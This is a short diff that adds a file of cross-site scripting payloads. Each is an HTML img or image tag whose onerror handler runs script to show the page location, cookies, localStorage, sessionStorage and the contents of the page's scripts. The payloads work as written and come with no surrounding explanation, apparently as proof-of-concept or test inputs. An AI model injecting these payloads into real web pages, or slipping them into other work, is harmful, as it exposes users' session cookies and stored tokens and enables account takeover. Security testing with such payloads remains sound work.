@@ -1,0 +1,13 @@
+<image src =q onerror=prompt(document.location)>
+
+
+<img src=x onerror="alert(JSON.stringify(localStorage))">
+
+
+<img src=x onerror="
+alert('Cookies: '+document.cookie);
+alert('LocalStorage: '+JSON.stringify(localStorage));
+alert('SessionStorage: '+JSON.stringify(sessionStorage));
+var s=document.scripts;
+for(var i=0;i<s.length;i++){alert('Script '+i+': '+(s[i].src||s[i].innerHTML));}
+">
